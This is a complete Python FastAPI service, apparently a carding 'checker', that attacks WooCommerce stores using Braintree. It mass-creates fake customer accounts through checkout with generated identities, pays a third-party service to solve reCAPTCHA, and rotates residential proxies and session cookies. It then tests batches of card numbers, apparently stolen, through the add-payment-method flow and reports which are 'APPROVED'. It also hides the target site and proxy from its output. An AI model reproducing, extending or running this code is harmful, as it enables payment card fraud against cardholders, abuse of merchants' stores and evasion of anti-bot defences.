# ═══════════════════════════════════════════════════════════════════
#  lm_killer.py — Braintree Auth gate / WooCommerce checkout-creation
#  Target defaults to env BASE_URL. Full architecture:
#   • checkout-based account creation (createaccount=1 before payment)
#   • 5-parallel creation threads, /stop with in-flight checkpoints
#   • sticky per-worker cookies (batch = distinct cookie per worker,
#     same cookie until it dies, then next)
#   • pool floor 20 / ceiling 600, 1:1 death replacement, watchdog
#   • CaptchaAI reCAPTCHA v2 solver + zero-balance circuit breaker
#   • lifetime stats (created/expired/failed + fail_reasons) persisted
#   • site traffic via residential proxy; solver/Braintree direct
#   • responses scrubbed — site name never leaks
# ═══════════════════════════════════════════════════════════════════

import time, json, sys, re, base64, uuid, random, os, threading
from datetime import datetime
from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import uvicorn
import requests as plain_requests
from faker import Faker
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

app = FastAPI()

# ─── Config (all env-overridable) ─────────────────────────────
GATEWAY_NAME = "Braintree Auth"
CREDIT = "@xoxhunterxd"
BASE_URL = (os.environ.get("BASE_URL") or os.environ.get("URL") or "").rstrip("/")
PROXY_URL = (os.environ.get("PROXY") or "").strip()          # set via env — never in code
COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_pool_lm.json")
STATS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_stats_lm.json")

MAX_ACCOUNTS = int(os.environ.get("MAX_ACCOUNTS", "600"))
MIN_ACCOUNTS = int(os.environ.get("MIN_ACCOUNTS", "20"))
POOL_WAIT_SECONDS = int(os.environ.get("POOL_WAIT_SECONDS", "120"))

CAPTCHA_AI_KEY = (os.environ.get("CAPTCHA_AI_KEY") or "").strip()   # set via env — never in code
RECAPTCHA_SITEKEY = os.environ.get("RECAPTCHA_SITEKEY", "6LeoHU8UAAAAACzQbWaynh9OgK0TZ96qWVoimBC6")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

# ─── Pool state ───────────────────────────────────────────────
_cookie_index = 0
_cookie_lock = threading.Lock()
_building_count = 0
_acc_requested = 0
_acc_done = 0
_acc_failed = 0
_building_lock = threading.Lock()
_stop_creating_event = threading.Event()


def load_pool():
    if os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, "r") as f:
                return json.load(f)
        except Exception:
            return []
    return []


def save_pool(pool):
    try:
        with open(COOKIE_FILE, "w") as f:
            json.dump(pool, f, indent=2)
    except Exception:
        pass


# ─── Lifetime stats ───────────────────────────────────────────
_stats_lock = threading.Lock()

def load_stats():
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"created_total": 0, "expired_total": 0, "failed_total": 0}

def save_stats(st):
    try:
        with open(STATS_FILE, "w") as f:
            json.dump(st, f, indent=2)
    except Exception:
        pass

def bump_stat(key, by=1):
    with _stats_lock:
        st = load_stats()
        st[key] = st.get(key, 0) + by
        save_stats(st)

def bump_fail_reason(reason):
    reason = (str(reason) or "unknown")[:60]
    with _stats_lock:
        st = load_stats()
        reasons = st.get("fail_reasons", {})
        reasons[reason] = reasons.get(reason, 0) + 1
        st["fail_reasons"] = reasons
        save_stats(st)


# ─── Sticky cookies — per-worker, distinct, until death ───────
_tls = threading.local()
_sticky_held = set()
_sticky_held_lock = threading.Lock()

def acquire_sticky_cookie_entry():
    pool = load_pool()
    if not pool:
        return None
    with _sticky_held_lock:
        live = {e.get("email") for e in pool}
        _sticky_held.intersection_update(live)
        for e in pool:
            if e.get("email") not in _sticky_held:
                _sticky_held.add(e.get("email"))
                return e
        return pool[0]

def release_sticky_cookie(entry):
    if not entry:
        return
    with _sticky_held_lock:
        _sticky_held.discard(entry.get("email"))
    if getattr(_tls, "sticky", None) and \
            _tls.sticky.get("email") == entry.get("email"):
        _tls.sticky = None

def get_worker_sticky_cookie():
    ent = getattr(_tls, "sticky", None)
    if ent is not None:
        pool = load_pool()
        if any(e.get("email") == ent.get("email") for e in pool):
            return ent
        release_sticky_cookie(ent)
        _tls.sticky = None
    ent = acquire_sticky_cookie_entry()
    _tls.sticky = ent
    return ent


def remove_cookie_entry(email):
    with _cookie_lock:
        pool = load_pool()
        new_pool = [entry for entry in pool if entry.get("email") != email]
        removed = len(pool) - len(new_pool)
        save_pool(new_pool)
    if removed > 0:
        bump_stat("expired_total", removed)
        try:
            replace_dead_cookie()
        except Exception:
            pass


# ─── Session / helpers ────────────────────────────────────────
def site_session():
    """Site traffic rides the residential proxy. Solver + Braintree stay direct."""
    s = plain_requests.Session()
    if PROXY_URL:
        s.proxies = {"http": PROXY_URL, "https": PROXY_URL}
    return s


def get_card_brand(cc):
    cc = str(cc).strip()
    if re.match(r"^4", cc): return "Visa"
    if re.match(r"^(5[1-5]|2[2-7])", cc): return "MasterCard"
    if re.match(r"^(34|37)", cc): return "American Express"
    if re.match(r"^(6011|65|64[4-9]|622)", cc): return "Discover"
    if re.match(r"^(352[89]|35[3-8][0-9])", cc): return "JCB"
    if re.match(r"^(30[0-5]|36|38)", cc): return "Diners Club"
    return "Unknown"


def luhn_check(cn):
    digits = [int(d) for d in str(cn) if d.isdigit()]
    if not digits:
        return False
    digits.reverse()
    total = sum(digits[0::2]) + sum(d - 9 if d > 9 else d for d in [x * 2 for x in digits[1::2]])
    return total % 10 == 0


def is_expired(mm, yy):
    try:
        month, year = int(mm), int(yy)
        if year < 100:
            year += 2000
        now = datetime.now()
        return year < now.year or (year == now.year and month < now.month)
    except Exception:
        return True


def sanitize(msg):
    if not msg:
        return ""
    msg = str(msg)
    msg = re.sub(r"https?://[^:\s]+:[^@\s]+@[^\s'\")\]]+", "", msg)      # creds in urls
    msg = re.sub(r"([a-zA-Z0-9._-]+:[0-9]+:[a-zA-Z0-9._-]+:[a-zA-Z0-9._-]+)", "", msg)
    msg = re.sub(r"HTTPS?ConnectionPool\([^)]+\):\s*", "", msg)
    msg = re.sub(r"https?://[^\s'\")\]]+", "", msg)                       # all urls
    if BASE_URL:
        host = BASE_URL.replace("https://", "").replace("http://", "").split("/")[0]
        if host:
            msg = re.sub(re.escape(host), "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg)
    msg = re.sub(r"proxy\.pinguproxy\.com(:\d+)?", "", msg, flags=re.IGNORECASE)
    msg = re.sub(r"ProxyError\([^)]+\)", "Proxy Connection Error", msg)
    msg = re.sub(r"NewConnectionError\([^)]+\)", "", msg)
    msg = re.sub(r"Max retries exceeded with url:.*", "Connection Timeout", msg)
    msg = re.sub(r"\s+", " ", msg)
    return msg.strip()


# ─── reCAPTCHA v2 solver (CaptchaAI) + circuit breaker ────────
_solver_cooldown_until = 0.0
_solver_lock = threading.Lock()
_last_solver_error = ""
_FATAL_SOLVER_ERRORS = ("ERROR_ZERO_BALANCE", "ERROR_KEY_DOES_NOT_EXIST",
                        "ERROR_WRONG_USER_KEY", "ERROR_IP_NOT_ALLOWED")

def _trip_solver_cooldown(err):
    global _solver_cooldown_until, _last_solver_error
    with _solver_lock:
        _last_solver_error = str(err)[:80]
        _solver_cooldown_until = time.time() + 300

def solver_in_cooldown():
    with _solver_lock:
        return time.time() < _solver_cooldown_until, _last_solver_error

def solve_recaptcha(page_url=None, sitekey=None, max_retry=3, poll_retry=40):
    if not sitekey:
        sitekey = RECAPTCHA_SITEKEY
    if not page_url:
        page_url = f"{BASE_URL}/checkout/"
    cooldown, _ = solver_in_cooldown()
    if cooldown:
        return None
    in_url = "https://ocr.captchaai.com/in.php"
    res_url = "https://ocr.captchaai.com/res.php"
    for _ in range(max_retry):
        try:
            r = plain_requests.get(in_url, params={
                "key": CAPTCHA_AI_KEY, "method": "userrecaptcha",
                "googlekey": sitekey, "pageurl": page_url, "json": 1,
            }, timeout=30)
            d = r.json()
            if d.get("status") != 1:
                err = str(d.get("request", ""))
                if any(f in err for f in _FATAL_SOLVER_ERRORS):
                    _trip_solver_cooldown(err)
                    return None
                continue
            for _ in range(poll_retry):
                time.sleep(4)
                rr = plain_requests.get(res_url, params={
                    "key": CAPTCHA_AI_KEY, "action": "get",
                    "id": d["request"], "json": 1,
                }, timeout=15)
                rd = rr.json()
                if rd.get("status") == 1:
                    return rd["request"]
                if "CAPCHA_NOT_READY" not in str(rd.get("request", "")):
                    break
        except Exception:
            pass
    return None


# ─── Product pool (Store API first, classic fallback) ─────────
_product_ids = []
_product_lock = threading.Lock()

def get_product_ids():
    global _product_ids
    with _product_lock:
        if _product_ids:
            return _product_ids
    ids = set()
    s = site_session()
    s.headers.update({"user-agent": UA})
    try:
        r = s.get(f"{BASE_URL}/wp-json/wc/store/v1/products?per_page=100",
                  timeout=25, headers={"Accept": "application/json"})
        if r.status_code == 200:
            for p in r.json():
                # simple products only — subscriptions/variables break checkout flow
                if p.get("type") == "simple" and p.get("is_purchasable") and p.get("is_in_stock"):
                    ids.add(str(p.get("id")))
    except Exception:
        pass
    if not ids:
        for u in (f"{BASE_URL}/shop/", f"{BASE_URL}/shop/page/2/", f"{BASE_URL}/"):
            try:
                r = s.get(u, timeout=20)
                if r.status_code == 200:
                    ids.update(re.findall(r'data-product_id="(\d+)"', r.text))
                    ids.update(re.findall(r"add-to-cart=(\d+)", r.text))
            except Exception:
                continue
            if ids:
                break
    with _product_lock:
        if ids:
            _product_ids = list(ids)
        return _product_ids


# ─── Account creation (checkout-based, proven recipe) ─────────
_billing_executor = ThreadPoolExecutor(max_workers=6, thread_name_prefix="billing")

def create_account(proxy=None):
    """Cart → checkout → captcha → tokenize throwaway card → POST checkout with
    createaccount=1. The account lands BEFORE payment, so the decline is free."""
    if not BASE_URL:
        return {"email": "", "status": "failed", "reason": "config_missing_base_url"}
    s = site_session()
    s.headers.update({
        "user-agent": UA,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
    })
    fake_us = Faker("en_US")
    first, last = fake_us.first_name(), fake_us.last_name()
    email = f"{first.lower()}{last.lower()}{random.randint(1975, 2005)}@gmail.com"
    password = f"Pass{random.randint(1000, 9999)}!#"
    phone = f"312{random.randint(220, 890)}{random.randint(1000, 9999)}"
    addr = random.choice([
        {"a": "850 N Michigan Ave", "z": "60611"},
        {"a": "233 S Wacker Dr", "z": "60606"},
        {"a": "500 W Madison St", "z": "60661"},
        {"a": "30 N LaSalle St", "z": "60602"},
    ])
    try:
        # 1. random product → cart (retry other products if checkout form no-shows)
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        pids = get_product_ids()
        if not pids:
            return {"email": email, "status": "failed", "reason": "no_product_found"}
        r_chk = soup = ne = None
        for attempt in range(3):
            pid = random.choice(pids)
            r = s.get(f"{BASE_URL}/cart/?add-to-cart={pid}", timeout=25)
            if r.status_code != 200:
                continue
            if _stop_creating_event.is_set():
                return {"email": email, "status": "failed", "reason": "stopped"}
            r_chk = s.get(f"{BASE_URL}/checkout/", timeout=25)
            if r_chk.status_code != 200:
                continue
            soup = BeautifulSoup(r_chk.text, "html.parser")
            ne = soup.find("input", {"name": "woocommerce-process-checkout-nonce"})
            if ne:
                break
        if not ne:
            return {"email": email, "status": "failed", "reason": "no_checkout_nonce"}
        pn = ne.get("value")
        cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r_chk.text)
        if not cm:
            return {"email": email, "status": "failed", "reason": "no_ct_nonce"}
        ctn = cm.group(1)

        # 3. captcha
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        gt = solve_recaptcha(f"{BASE_URL}/checkout/")
        if not gt:
            return {"email": email, "status": "failed", "reason": "captcha"}

        # 4. braintree client token + throwaway tokenize
        ah = {"accept": "application/json, text/javascript, */*; q=0.01",
              "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
              "origin": BASE_URL, "referer": f"{BASE_URL}/checkout/",
              "x-requested-with": "XMLHttpRequest"}
        rt = s.post(f"{BASE_URL}/wp-admin/admin-ajax.php",
                    data={"action": "wc_braintree_credit_card_get_client_token", "nonce": ctn},
                    headers=ah, timeout=20)
        ct = (rt.json() or {}).get("data")
        if not ct:
            return {"email": email, "status": "failed", "reason": "no_bt_token"}
        dec = json.loads(base64.b64decode(ct).decode("utf-8"))
        client_api = dec["clientApiUrl"]
        fingerprint = dec["authorizationFingerprint"]
        rtk = plain_requests.post(f"{client_api}/v1/payment_methods/credit_cards", json={
            "creditCard": {"number": "4111111111111111", "expirationMonth": "12",
                           "expirationYear": "2030", "cvv": "123"},
            "authorizationFingerprint": fingerprint,
            "braintreeLibraryVersion": "braintree/web/3.88.0",
            "_meta": {"platform": "web", "sdkVersion": "3.88.0", "source": "form",
                      "integration": "custom", "sessionId": uuid.uuid4().hex}
        }, timeout=30)
        try:
            cn = rtk.json()["creditCards"][0]["nonce"]
        except Exception:
            return {"email": email, "status": "failed",
                    "reason": f"tokenize: {sanitize(rtk.text[:60])}"}

        # 5. checkout POST — account creation happens before payment
        if _stop_creating_event.is_set():
            return {"email": email, "status": "failed", "reason": "stopped"}
        pl = {}
        for inp in soup.find_all("input"):
            n, v = inp.get("name"), inp.get("value")
            if n:
                pl[n] = v or ""
        pl.update({
            "billing_first_name": first, "billing_last_name": last, "billing_company": "",
            "billing_country": "US", "billing_address_1": addr["a"], "billing_address_2": "",
            "billing_city": "Chicago", "billing_state": "IL", "billing_postcode": addr["z"],
            "billing_phone": phone, "billing_email": email, "account_password": password,
            "createaccount": "1", "shipping_same_as_billing": "1",
            "payment_method": "braintree_credit_card",
            "wc_braintree_credit_card_payment_nonce": cn,
            "wc_braintree_device_data": json.dumps({
                "device_session_id": uuid.uuid4().hex, "fraud_merchant_id": "600000",
                "correlation_id": uuid.uuid4().hex}),
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "woocommerce-process-checkout-nonce": pn, "g-recaptcha-response": gt,
            "_wp_http_referer": "/checkout/"
        })
        s.post(f"{BASE_URL}/checkout/?wc-ajax=checkout", data=pl, headers=ah, timeout=30)
        cd = s.cookies.get_dict()
        if not any("wordpress_logged_in" in k or "woocommerce_session" in k for k in cd):
            return {"email": email, "status": "failed", "reason": "no_cookies"}

        # 6. save — billing already passed during checkout
        new_entry = {"email": email, "password": password, "cookies": cd,
                     "billing": True, "created_at": time.strftime("%Y-%m-%d %H:%M:%S")}
        pool = load_pool()
        pool.append(new_entry)
        if len(pool) > MAX_ACCOUNTS:
            pool = pool[-MAX_ACCOUNTS:]
        save_pool(pool)
        bump_stat("created_total")
        return {"email": email, "status": "success"}
    except Exception as e:
        return {"email": email, "status": "failed", "reason": str(e)[:80]}


def create_accounts_bg(count, proxy=None):
    global _building_count, _acc_requested, _acc_done, _acc_failed
    _stop_creating_event.clear()
    with _building_lock:
        _building_count += count
        _acc_requested += count

    def worker():
        global _building_count, _acc_done, _acc_failed
        if _stop_creating_event.is_set():
            with _building_lock:
                _building_count -= 1
            return False
        result = create_account(proxy=proxy)
        ok = bool(result and result.get("status") == "success")
        stopped = bool(result and result.get("reason") == "stopped")
        with _building_lock:
            _building_count -= 1
            if ok:
                _acc_done += 1
            elif not stopped:
                _acc_failed += 1
        if not ok and not stopped:
            bump_stat("failed_total")
            bump_fail_reason((result or {}).get("reason", "unknown"))
        return True

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i in range(count):
            if _stop_creating_event.is_set():
                remaining = count - i
                with _building_lock:
                    _building_count -= remaining
                    _acc_failed += remaining
                break
            futures.append(executor.submit(worker))
            time.sleep(random.uniform(0.5, 1.5))
        for _ in as_completed(futures):
            pass


# ─── Pool floor / ceiling / 1:1 replacement ───────────────────
_refill_lock = threading.Lock()

def replace_dead_cookie():
    cooldown, _ = solver_in_cooldown()
    if cooldown:
        return
    with _refill_lock:
        pool = load_pool()
        with _building_lock:
            building = _building_count
        total = len(pool) + building
        if total >= MAX_ACCOUNTS:
            return
        need = min(MIN_ACCOUNTS - total, MAX_ACCOUNTS - total) if len(pool) < MIN_ACCOUNTS else 1
        if need <= 0:
            return
        threading.Thread(target=create_accounts_bg, args=(need,), daemon=True).start()

def maybe_auto_refill():
    pool = load_pool()
    with _building_lock:
        building = _building_count
    total = len(pool) + building
    if len(pool) >= MIN_ACCOUNTS or total >= MAX_ACCOUNTS:
        return
    cooldown, _ = solver_in_cooldown()
    if cooldown:
        return
    with _refill_lock:
        pool = load_pool()
        with _building_lock:
            building = _building_count
        total = len(pool) + building
        if len(pool) >= MIN_ACCOUNTS or total >= MAX_ACCOUNTS:
            return
        need = min(MIN_ACCOUNTS - total, MAX_ACCOUNTS - total)
        if need <= 0:
            return
        threading.Thread(target=create_accounts_bg, args=(need,), daemon=True).start()

def wait_for_min_pool(timeout=POOL_WAIT_SECONDS):
    t0 = time.time()
    while time.time() - t0 < timeout:
        pool = load_pool()
        if len(pool) >= MIN_ACCOUNTS:
            return True
        maybe_auto_refill()
        if pool:
            return True
        time.sleep(2)
    return bool(load_pool())

def _pool_watchdog():
    while True:
        try:
            maybe_auto_refill()
        except Exception:
            pass
        time.sleep(30)


# ─── Card checker (add-payment-method flow) ───────────────────
def check_card(cc, mm, yy, cvv, proxy=None):
    t0 = time.time()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    brand = get_card_brand(cc)

    def result(msg):
        return {"card": card_str, "gateway": GATEWAY_NAME, "response": sanitize(msg),
                "time": f"{time.time()-t0:.1f}s", "credit": CREDIT}

    if not luhn_check(cc):
        return result("Card is Incorrect")
    if is_expired(mm, yy):
        return result("Expired Card")
    cvv_c = str(cvv).strip()
    if brand == "American Express" and len(cvv_c) != 4:
        return result("Invalid CVV (4 digits for Amex)")
    if brand != "American Express" and len(cvv_c) != 3:
        return result("Invalid CVV (3 digits required)")

    pool = load_pool()
    if not pool:
        if not wait_for_min_pool():
            return result("No cookies! Auto-refill running — retry shortly")

    if not BASE_URL:
        return result("Config error: BASE_URL env not set")

    s = site_session()
    s.headers.update({
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9", "user-agent": UA,
    })

    saved_entry = get_worker_sticky_cookie()
    if saved_entry:
        for k, v in saved_entry.get("cookies", {}).items():
            s.cookies.set(k, v)

    ae = an = r = None
    # 1. apm page — sticky cookie; on death, rotate through up to 10 more
    try:
        r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=25)
        soup = BeautifulSoup(r.text, "html.parser")
        ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
        dead = ((r.status_code == 200 and "add-payment-method" not in r.url)
                or r.status_code in (301, 302)) and not ae
        if dead:
            if saved_entry and saved_entry.get("email"):
                remove_cookie_entry(saved_entry["email"])
            release_sticky_cookie(saved_entry)
            for _ in range(min(len(load_pool()), 10)):
                alt_entry = get_worker_sticky_cookie()
                if not alt_entry:
                    break
                s.cookies.clear()
                for k, v in alt_entry.get("cookies", {}).items():
                    s.cookies.set(k, v)
                r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=25)
                soup = BeautifulSoup(r.text, "html.parser")
                ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
                if ae:
                    break
                if alt_entry.get("email"):
                    remove_cookie_entry(alt_entry["email"])
                release_sticky_cookie(alt_entry)
            else:
                return result("Session expired or invalid cookie. Hit /b3?acc=4")
    except Exception as e:
        return result(f"Page error: {sanitize(e)}")

    # 2. nonces
    try:
        if not ae:
            nm = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([a-f0-9]+)["\']', r.text)
            if not nm:
                return result("No nonce")
            an = nm.group(1)
        else:
            an = ae.get("value")
        cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r.text) \
            or re.search(r'client_token_nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']', r.text)
        if not cm:
            return result("No client_token_nonce")
        ctn = cm.group(1)
    except Exception as e:
        return result(f"Parse error: {sanitize(e)}")

    # 3. braintree client token
    try:
        rb = s.post(f"{BASE_URL}/wp-admin/admin-ajax.php",
                    data={"action": "wc_braintree_credit_card_get_client_token", "nonce": ctn},
                    headers={"accept": "application/json, text/javascript, */*; q=0.01",
                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                             "origin": BASE_URL,
                             "referer": f"{BASE_URL}/my-account/add-payment-method/",
                             "x-requested-with": "XMLHttpRequest"}, timeout=20)
        bd = rb.json()
        if not bd.get("data"):
            return result("No Braintree token")
        dec = json.loads(base64.b64decode(bd["data"]).decode("utf-8"))
        client_api = dec["clientApiUrl"]
        fingerprint = dec["authorizationFingerprint"]
    except Exception as e:
        return result(f"Token error: {sanitize(e)}")

    # 4. tokenize card
    try:
        ey = ("20" + yy) if len(yy) == 2 else yy
        rt = plain_requests.post(f"{client_api}/v1/payment_methods/credit_cards", json={
            "creditCard": {"number": cc, "expirationMonth": mm,
                           "expirationYear": ey, "cvv": cvv_c},
            "authorizationFingerprint": fingerprint,
            "braintreeLibraryVersion": "braintree/web/3.88.0",
            "_meta": {"platform": "web", "sdkVersion": "3.88.0", "source": "form",
                      "integration": "custom", "sessionId": uuid.uuid4().hex}
        }, timeout=30)
        if rt.status_code != 201:
            try:
                er = rt.json()
                m = er.get("error", {}).get("message", "")
                if not m:
                    fl = []
                    for fe in er.get("fieldErrors", []):
                        for sub in fe.get("fieldErrors", []):
                            fl.append(sub.get("message", ""))
                    m = "; ".join(fl) if fl else rt.text[:100]
            except Exception:
                m = rt.text[:100]
            return result(f"Tokenization: {sanitize(m)}")
        cn = rt.json()["creditCards"][0]["nonce"]
        ct = rt.json()["creditCards"][0].get("type", brand.lower())
        dd = json.dumps({"device_session_id": uuid.uuid4().hex,
                         "fraud_merchant_id": "600000",
                         "correlation_id": uuid.uuid4().hex})
    except Exception as e:
        return result(f"Tokenize error: {sanitize(e)}")

    # 5. submit add-payment-method
    try:
        rs = s.post(f"{BASE_URL}/my-account/add-payment-method/", data={
            "payment_method": "braintree_credit_card",
            "wc-braintree-credit-card-card-type": ct,
            "wc-braintree-credit-card-3d-secure-enabled": "",
            "wc-braintree-credit-card-3d-secure-verified": "",
            "wc-braintree-credit-card-3d-secure-order-total": "150.00",
            "wc_braintree_credit_card_payment_nonce": cn,
            "wc_braintree_device_data": dd,
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "woocommerce-add-payment-method-nonce": an,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1",
        }, headers={"content-type": "application/x-www-form-urlencoded", "origin": BASE_URL,
                    "referer": f"{BASE_URL}/my-account/add-payment-method/"},
            timeout=30, allow_redirects=True)
    except Exception as e:
        return result(f"Submit error: {sanitize(e)}")

    # 6. parse
    try:
        s2 = BeautifulSoup(rs.text, "html.parser")
        if "payment-methods" in rs.url and "add" not in rs.url:
            return result("APPROVED - Payment Method Added")
        se = s2.find(class_="woocommerce-message")
        if se and se.get_text().strip():
            return result(f"APPROVED - {se.get_text().strip()}")
        ee = s2.find(class_="woocommerce-error")
        if ee:
            raw = re.sub(r"\s+", " ", ee.get_text().strip())
            mx = re.search(r"Status code (\d+):\s*(.+)", raw)
            if mx:
                return result(f"Declined [{mx.group(1)}]: {mx.group(2).strip()}")
            if "gateway reject" in raw.lower():
                if "cvv" in raw.lower():
                    return result("Card Issuer Declined CVV")
                if "fraud" in raw.lower():
                    return result("Declined - Fraud Detection")
                if "avs" in raw.lower():
                    return result("Declined - AVS Mismatch")
                return result(f"Gateway Rejected: {sanitize(raw)}")
            if "insufficient" in raw.lower():
                return result("Insufficient Funds")
            return result(sanitize(raw))
        return result("Card Declined")
    except Exception as e:
        return result(f"Parse error: {sanitize(e)}")


# ─── Batch ────────────────────────────────────────────────────
def parse_card_list(raw):
    if not raw:
        return []
    cards = []
    for m in re.finditer(r"((?:34|37)\d{13}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{4})|(\d{13,19}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{3})", raw):
        c = m.group(1) or m.group(2)
        if c and c not in cards:
            cards.append(c)
            if len(cards) >= 30:
                break
    if cards:
        return cards
    for p in re.split(r"[\s,\n\r]+", raw):
        sp = re.split(r"[|:]", p.strip())
        if len(sp) >= 4 and all(x.isdigit() for x in sp[:4]):
            f = f"{sp[0]}|{sp[1]}|{sp[2]}|{sp[3]}"
            if f not in cards:
                cards.append(f)
                if len(cards) >= 30:
                    break
    return cards[:30]


def process_single_card(card_item, proxy):
    parts = re.split(r"[|:]", card_item)
    if len(parts) >= 4:
        time.sleep(random.uniform(1.0, 2.5))
        return check_card(parts[0], parts[1], parts[2], parts[3], proxy=proxy)
    return {"card": card_item, "response": "Invalid format", "time": "0.0s", "credit": CREDIT}


def config_check():
    """Which env vars are missing — surfaces in stats so a broken deploy is
    obvious from the first GET / instead of dying silently."""
    return {
        "base_url": bool(BASE_URL),
        "proxy": bool(PROXY_URL),
        "captcha_key": bool(CAPTCHA_AI_KEY),
    }

def stats_payload():
    st = load_stats()
    pool = load_pool()
    with _building_lock:
        building = _building_count
        requested = _acc_requested
        done = _acc_done
        failed = _acc_failed
    cooldown, solver_err = solver_in_cooldown()
    cfg = config_check()
    return {
        "status": "ok" if all(cfg.values()) else "config_incomplete",
        "config": cfg,
        "total_accounts_created": st.get("created_total", 0),
        "working_accounts": len(pool),
        "total_cookies": len(pool),
        "building": building,
        "failed_during_building": failed,
        "expired": st.get("expired_total", 0),
        "failed_total": st.get("failed_total", 0),
        "fail_reasons": st.get("fail_reasons", {}),
        "solver_ok": not cooldown,
        "solver_error": solver_err if cooldown else "",
        "session": {"requested": requested, "done": done, "failed": failed},
        "pool_min": MIN_ACCOUNTS,
        "pool_max": MAX_ACCOUNTS,
    }


# ─── FastAPI ──────────────────────────────────────────────────
@app.on_event("startup")
def _start():
    if BASE_URL:
        try:
            maybe_auto_refill()
            threading.Thread(target=_pool_watchdog, daemon=True).start()
        except Exception:
            pass


@app.get("/")
def root():
    d = stats_payload()
    d["gateway"] = GATEWAY_NAME
    d["credit"] = CREDIT
    return d


@app.get("/b3")
def b3(cc: str = None, acc: str = None, account: str = None, p: str = None):
    if account is not None:
        pool = load_pool()
        d = stats_payload()
        d["accounts"] = [{"email": a["email"], "created": a.get("created_at", "?")} for a in pool]
        d["credit"] = CREDIT
        return d

    if acc is not None:
        acc_str = str(acc).strip().lower()
        if acc_str in ("0", "status", "info"):
            pool = load_pool()
            d = stats_payload()
            d["pool_size"] = d["total_cookies"]
            d["accounts"] = [{"email": a["email"], "created": a.get("created_at", "?")} for a in pool]
            d["credit"] = CREDIT
            return d
        try:
            count = max(1, int(acc))
        except Exception:
            count = 4
        pool = load_pool()
        with _building_lock:
            building = _building_count
        allowed = MAX_ACCOUNTS - len(pool) - building
        if allowed <= 0:
            return {"status": "max_reached", "creating": 0, "current_pool": len(pool),
                    "building": building, "max_accounts": MAX_ACCOUNTS,
                    "message": f"Pool at ceiling ({MAX_ACCOUNTS}).", "credit": CREDIT}
        count = min(count, allowed)
        threading.Thread(target=create_accounts_bg, args=(count,), daemon=True).start()
        return {"status": "creating", "creating": count, "current_pool": len(pool),
                "building": building, "max_accounts": MAX_ACCOUNTS,
                "message": f"Creating {count} in background. /b3?acc=0 for status.",
                "credit": CREDIT}

    if not cc:
        return JSONResponse(status_code=400,
                            content={"error": "Missing cc or acc param", "credit": CREDIT})
    parts = re.split(r"[|:]", cc)
    if len(parts) >= 4:
        return check_card(parts[0], parts[1], parts[2], parts[3], proxy=p)
    return JSONResponse(status_code=400,
                        content={"error": "Format: cc|mm|yy|cvv", "credit": CREDIT})


@app.get("/batch")
def batch(cc: str = None, c: str = None, p: str = None):
    raw = cc or c
    if not raw:
        return JSONResponse(status_code=400, content={"error": "Missing cc/c param"})
    cards = parse_card_list(raw)
    if not cards:
        return JSONResponse(status_code=400, content={"error": "No valid cards"})
    t0 = time.time()
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {}
        for card in cards:
            parts = re.split(r"[|:]", card)
            if len(parts) >= 4:
                futs[ex.submit(process_single_card, card, p)] = card
            else:
                results.append({"card": card, "response": "Invalid format", "time": "0.0s"})
        for f in as_completed(futs):
            try:
                results.append(f.result())
            except Exception as e:
                results.append({"card": futs[f], "response": str(e)[:80], "time": "0.0s"})
    return {"results": results, "total_cards": len(results), "gateway": GATEWAY_NAME,
            "total_time": f"{time.time()-t0:.1f}s", "credit": CREDIT}


@app.get("/stop")
def stop_creating():
    _stop_creating_event.set()
    d = stats_payload()
    d["status"] = "stopped"
    d["message"] = ("Account creation stopped. Pending workers cancelled; in-flight "
                    "accounts abort at their next checkpoint.")
    d["credit"] = CREDIT
    return d


# ─── Main ─────────────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) > 1 and "|" in sys.argv[1]:
        parts = re.split(r"[|:]", sys.argv[1].strip())
        if len(parts) >= 4:
            res = check_card(parts[0], parts[1], parts[2], parts[3])
            print(json.dumps(res, indent=2))
            sys.exit(0)

    port = int(os.environ.get("PORT", 8000))
    print(f"Cookie pool: {len(load_pool())} (min {MIN_ACCOUNTS} / max {MAX_ACCOUNTS})")
    try:
        maybe_auto_refill()
        threading.Thread(target=_pool_watchdog, daemon=True).start()
    except Exception:
        pass
    print(f"Starting FastAPI on port {port}")
    uvicorn.run(app, host="0.0.0.0", port=port)
